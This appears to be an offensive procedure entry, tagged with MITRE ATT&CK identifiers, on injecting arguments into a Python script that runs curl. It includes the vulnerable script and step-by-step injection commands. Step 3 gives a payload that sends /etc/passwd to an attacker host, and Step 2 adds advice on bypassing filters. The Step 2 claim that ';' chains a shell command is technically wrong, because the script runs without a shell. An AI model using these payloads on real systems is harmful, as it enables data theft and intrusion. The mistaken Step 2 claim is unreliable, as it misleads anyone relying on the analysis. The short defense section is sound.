---
id: 9ed42429-b473-4418-bee1-eaac66fc41ea
name: Command-Injection-via-Curl-Arguments
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:54.022953+00:00'
updated_at: '2023-04-06T03:55:54.041570+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter/Command-Line-Interface|T1059.004
    - Command-Line Interface]]
sub_techniques: []
tags:
  - '[[tags/Argument Injection]]'
  - command-injection
  - rce
commands:
  - '[[commands/curl-download-file]]'
  - '[[commands/execute-vulnerable-curl-script]]'
  - '[[commands/curl-get-jsonplaceholder-post]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# Command-Injection-via-Curl-Arguments

## Summary

This procedure demonstrates how to exploit a command injection vulnerability in a Python script that dynamically constructs and executes curl commands using user-supplied arguments without proper sanitization. By crafting malicious input, an attacker can inject additional curl flags or shell metacharacters to execute arbitrary system commands, such as downloading files, exfiltrating data, or running shell commands.

## Description

The vulnerability arises in applications or scripts that parse user input as command-line arguments for tools like curl without validating or quoting them properly. In this case, a Python script uses shlex.split() on user input to append arguments to a base 'curl' command and executes it via subprocess.Popen(). This allows attackers to inject shell metacharacters (e.g., ';', '&&') or additional curl options to alter the command's behavior. This technique is common in web applications, CI/CD pipelines, or automation scripts handling URLs or file downloads. Successful exploitation leads to remote code execution (RCE) on the target system, assuming the script runs with sufficient privileges. The target environment is typically a Unix-like system with Python and curl installed.

## Requirements

1. Access to input a string argument to the vulnerable Python script (e.g., via a web form, API endpoint, or direct command-line invocation).
2. Python 3.x and curl installed on the target system.
3. Network access for the target to reach external URLs (for download/exfiltration payloads).
4. Knowledge of the base command structure to craft effective injections.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization: Whitelist allowed characters and reject metacharacters like ';', '|', '&', or backticks.
- Use parameterized execution: Instead of string concatenation or split(), pass arguments directly to subprocess without shell interpretation (e.g., list-based Popen with validated args).
- Run scripts with least privilege: Use non-root users and containerization to limit impact of injected commands.
- Monitor for anomalies: Log all executed commands, watch for unexpected network connections or file creations from curl executions, and use tools like auditd or AppArmor to detect unauthorized subprocess spawns.

## Objectives

1. Inject additional arguments or shell commands into the curl execution to alter its behavior.
2. Download and potentially execute malicious files on the target system.
3. Exfiltrate data or gather system information via injected commands.
4. Achieve arbitrary code execution for further post-exploitation.

## Instructions

### Step 1: Verify Normal Curl Execution

**Context**: First, test the vulnerable script with a benign input to confirm it executes a standard curl download without issues. This establishes baseline behavior and ensures the script is functional.

**Command** ([[commands/curl-download-file]]):
```bash
curl https://www.google.fr -o test.html
```

Execute the vulnerable script with safe arguments:
```bash
python vulnerable_curl.py "https://www.google.fr -o test.html"
```

> This runs curl to download the Google France homepage as an HTML file. shlex.split() parses the input string into ['https://www.google.fr', '-o', 'test.html'], which is appended to ['curl'] and executed safely.

### Step 2: Craft and Execute Injected Command

**Context**: Exploit the lack of quoting by injecting shell metacharacters or additional flags into the argument string. For example, append '; id' to run the 'id' command after curl, demonstrating RCE. This step shows how unsanitized input leads to command chaining.

Use the vulnerable script code from [[codes/Vulnerable-Curl-Executor-Script]] embedded here for reference:

```python
from shlex import quote, split
import sys
import subprocess

if __name__ == "__main__":
    command = ['curl']
    command = command + split(sys.argv[1])
    print(command)
    r = subprocess.Popen(command)
```

**Command** ([[commands/execute-vulnerable-curl-script]]):
```bash
python vulnerable_curl.py "https://www.google.fr -o test.html ; id"
```

> The input is split into ['https://www.google.fr', '-o', 'test.html', ';', 'id'], resulting in the executed command: curl https://www.google.fr -o test.html ; id. The shell metacharacter ';' chains the commands, running 'id' after curl completes. If successful, this outputs the current user's UID/GID, confirming injection.

Decision point: If the injection fails (e.g., due to error handling), try alternatives like '&& id' for conditional chaining or encode payloads to bypass filters.

### Step 3: Test with Data Exfiltration Example

**Context**: Extend the injection to perform data exfiltration, such as fetching a remote post and appending system info. This simulates a real-world payload where curl is abused to send data outbound.

**Command** ([[commands/curl-get-jsonplaceholder-post]]):
```bash
curl -X GET https://jsonplaceholder.typicode.com/posts/1
```

Execute with injection:
```bash
python vulnerable_curl.py "-X GET https://jsonplaceholder.typicode.com/posts/1 -d @/etc/passwd http://attacker.com/exfil"
```

> This injects flags to GET a JSON post and then POST local file contents (/etc/passwd) to an attacker-controlled server. Expected: JSON response followed by successful exfiltration if the server receives the data.

Verify success by checking the attacker's server logs for received data.
